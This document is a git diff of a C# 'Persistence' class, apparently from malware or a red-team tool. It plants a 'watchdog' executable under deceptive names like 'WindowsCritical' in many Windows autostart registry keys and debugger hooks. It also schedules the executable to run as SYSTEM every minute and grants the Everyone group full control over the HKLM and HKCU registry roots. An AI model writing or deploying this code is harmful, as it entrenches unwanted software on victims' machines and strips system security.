@@ -1,33 +1,40 @@
-using System;
 using System.Diagnostics;
 using Microsoft.Win32;
+using System.Security.AccessControl;
+using System.Security.Principal;
+using System.IO;
 
 
-namespace Persistence
-{
+
     public class Persistence
     {
 
         public static void runAllTechniques()
         {
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
+            GrantEveryoneFullControl(Registry.CurrentUser);
+
+        //CurrentUser keys dont run as System and are not in use
+
+        SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
+            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\WindowsLoad", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRename", 1, RegistryHive.CurrentUser);
+            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
 
 
 
             SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\AeDebug\Debugger", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
             SetRegistryKey(@"Software\Microsoft\Windows\Windows Error Reporting\Hangs\Debugger", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
 
-            SetRegistryKey(@"Software\Microsoft\Command Processor\AutoRun", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser); //Runs when cmd.exe starts
+            //SetRegistryKey(@"Software\Microsoft\Command Processor\AutoRun", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser); //Runs when cmd.exe starts
 
 
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //These three are Windows background processes
@@ -42,191 +49,139 @@ namespace Persistence
             {
                 // Create or re-enable the task if it doesn't exist or is inactive
                 CreateScheduledTask(taskName, Config.PrimaryWatchdogFullPath, 1); // Runs every 1 minute
-                Console.WriteLine($"Scheduled task '{taskName}' created or re-enabled successfully.");
+                watchdogHelper.Log($"Scheduled task '{taskName}' created or re-enabled successfully.");
             }
             else
             {
-                Console.WriteLine($"Scheduled task '{taskName}' already exists and is active.");
+                watchdogHelper.Log($"Scheduled task '{taskName}' already exists and is active.");
 
             }
-            GrantEveryoneFullControlOnDirectory(Config.PrimaryWatchdogPath);
-            GrantEveryoneFullControlOnDirectory(Config.SecondaryWatchdogPath);
-            GrantEveryoneFullControlOnDirectory(Config.PayloadPath);
-
-            GrantEveryoneFullControl("HKLM");
-            GrantEveryoneFullControl("HKLU");
 
         }
 
-            static bool TaskExistsAndActive(string taskName)
+        private static bool TaskExistsAndActive(string taskName)
+        {
+        try
+        {
+            Process process = new Process();
+            process.StartInfo.FileName = "schtasks";
+            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
+
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+
+            // Check if the task exists and is active
+            return output.Contains(taskName) && output.Contains("Status: Ready");
+        }
+        catch (Exception ex) { 
+            watchdogHelper.Log($"Error verifying task exists and active: {ex.Message}");
+            return false;
+        }
+        }
+
+        // Function to create a scheduled task to run every 30 seconds
+        private static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
+        {
+        try
+        {
+            // Create the schtasks command to run every 30 seconds
+            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59 /RU SYSTEM"; //sets system permissions
+
+            Process process = new Process();
+            process.StartInfo.FileName = "schtasks";
+            process.StartInfo.Arguments = command;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
+
+            process.Start();
+            process.WaitForExit();
+        }
+        catch (Exception ex) {
+            watchdogHelper.Log($"Error creating scheduled task: {ex.Message}");
+        }
+        }
+
+        private static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
+        {
+            try
             {
-                Process process = new Process();
-                process.StartInfo.FileName = "schtasks";
-                process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.CreateNoWindow = true;
-
-                process.Start();
-                string output = process.StandardOutput.ReadToEnd();
-                process.WaitForExit();
-
-                // Check if the task exists and is active
-                return output.Contains(taskName) && output.Contains("Status: Ready");
-            }
-
-            // Function to create a scheduled task to run every 30 seconds
-            static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
-            {
-                // Create the schtasks command to run every 30 seconds
-                string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59";
-
-                Process process = new Process();
-                process.StartInfo.FileName = "schtasks";
-                process.StartInfo.Arguments = command;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.CreateNoWindow = true;
-
-                process.Start();
-                process.WaitForExit();
-            }
-
-            public static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
-            {
-                try
+                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
                 {
-                    using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
+                    using (RegistryKey key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true))
                     {
-                        using (RegistryKey key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true))
+                        if (key != null)
                         {
-                            if (key != null)
+                            object ?currentValue = key.GetValue(valueName);
+                            if (currentValue == null || !currentValue.Equals(value))
                             {
-                                object currentValue = key.GetValue(valueName);
-                                if (currentValue == null || !currentValue.Equals(value))
-                                {
-                                    key.SetValue(valueName, value);
-                                }
+                                key.SetValue(valueName, value); //sets registry key
                             }
-                            else
-                            {
-                                throw new IOException($"Failed to create or open registry key: {keyPath}");
-                            }
+                        }
+                        else
+                        {
+                            throw new IOException($"Failed to create or open registry key: {keyPath}");
                         }
                     }
                 }
-                catch (UnauthorizedAccessException ex)
-                {
-                    LogError($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
-                }
-                catch (IOException ex)
-                {
-                    LogError($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
-                }
-                catch (Exception ex)
-                {
-                    LogError($"Unexpected error: {ex.Message}");
-                }
             }
-
-            private static void LogError(string message)
+            catch (UnauthorizedAccessException ex)
             {
-                // Log to a file, event log, or other logging mechanism
-                Console.WriteLine($"[ERROR] {message}");  // Example logging
+                watchdogHelper.Log($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
             }
-
-            public static void GrantEveryoneFullControl(string registryHive)
-    {
-        try
-        {
-            // Select the correct registry key (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER)
-            RegistryKey rootKey = registryHive.ToUpper() switch
+            catch (IOException ex)
             {
-                "HKLM" => Registry.LocalMachine,
-                "HKCU" => Registry.CurrentUser,
-                _ => throw new ArgumentException("Invalid registry hive specified. Use 'HKLM' or 'HKCU'.")
-            };
-
-            // Get the current access control for the key
-            RegistrySecurity registrySecurity = rootKey.GetAccessControl();
-
-            // Create a new rule that grants "Everyone" Full Control
-            RegistryAccessRule rule = new RegistryAccessRule(
-                new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
-                RegistryRights.FullControl,                               // Full control
-                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
-                PropagationFlags.None,                                    // Don't propagate further
-                AccessControlType.Allow                                   // Allow the rule
-            );
-
-            // Add the rule to the security object
-            registrySecurity.AddAccessRule(rule);
-
-            // Enable inheritance for subkeys
-            registrySecurity.SetAccessRuleProtection(false, false);
-
-            // Apply the modified security settings to the key
-            rootKey.SetAccessControl(registrySecurity);
-
-            Console.WriteLine($"Successfully granted 'Everyone' full control and enabled inheritance on {registryHive}.");
-        }
-        catch (UnauthorizedAccessException ex)
-        {
-            Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
-        }
-        catch (ArgumentException ex)
-        {
-            Console.WriteLine($"Error: {ex.Message}");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"An error occurred: {ex.Message}");
-        }
-    }
-
-    public static void GrantEveryoneFullControlOnDirectory(string directoryPath)
-    {
-        try
-        {
-            // Check if the directory exists
-            if (!Directory.Exists(directoryPath))
-            {
-                throw new DirectoryNotFoundException($"The specified directory does not exist: {directoryPath}");
+                watchdogHelper.Log($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
             }
-
-            // Get the current access control settings for the directory
-            DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
-            DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
-
-            // Create a new rule that grants "Everyone" full control
-            FileSystemAccessRule rule = new FileSystemAccessRule(
-                new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
-                FileSystemRights.FullControl,                           // Full control
-                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions to all subfolders and files
-                PropagationFlags.None,                                  // Don't propagate further
-                AccessControlType.Allow                                 // Allow the rule
-            );
-
-            // Add the rule to the directory security object
-            directorySecurity.AddAccessRule(rule);
-
-            // Apply the modified security settings to the directory
-            directoryInfo.SetAccessControl(directorySecurity);
-
-            Console.WriteLine($"Successfully granted 'Everyone' full control on the directory: {directoryPath}");
+            catch (Exception ex)
+            {
+                watchdogHelper.Log($"Unexpected error: {ex.Message}");
+            }
         }
-        catch (UnauthorizedAccessException ex)
-        {
-            Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
-        }
-        catch (DirectoryNotFoundException ex)
-        {
-            Console.WriteLine($"Error: {ex.Message}");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"An error occurred: {ex.Message}");
-        }
-    }
+
         
+
+        private static void GrantEveryoneFullControl(RegistryKey rootKey)
+        {
+            try
+            {
+                // Get the current access control for the key
+                RegistrySecurity registrySecurity = rootKey.GetAccessControl();
+
+                // Create a new rule that grants "Everyone" Full Control
+                RegistryAccessRule rule = new RegistryAccessRule(
+                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
+                    RegistryRights.FullControl,                               // Full control
+                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
+                    PropagationFlags.None,                                    // Don't propagate further
+                    AccessControlType.Allow                                   // Allow the rule
+                );
+
+                // Add the rule to the security object
+                registrySecurity.AddAccessRule(rule);
+
+                // Enable inheritance for subkeys
+                registrySecurity.SetAccessRuleProtection(false, false);
+
+                // Apply the modified security settings to the key
+                rootKey.SetAccessControl(registrySecurity);
+
+                watchdogHelper.Log($"Successfully granted 'Everyone' full control and enabled inheritance on {rootKey}.");
+            }
+            catch (UnauthorizedAccessException ex)
+            {
+                watchdogHelper.Log($"Error: Access denied. Run the application with administrator privileges. Error: {ex.Message}");
+            }
+            catch (ArgumentException ex)
+            {
+                watchdogHelper.Log($"Error: {ex.Message}");
+            }
+            catch (Exception ex)
+            {
+                watchdogHelper.Log($"An error occurred: {ex.Message}");
+            }
+        }
     }
-}
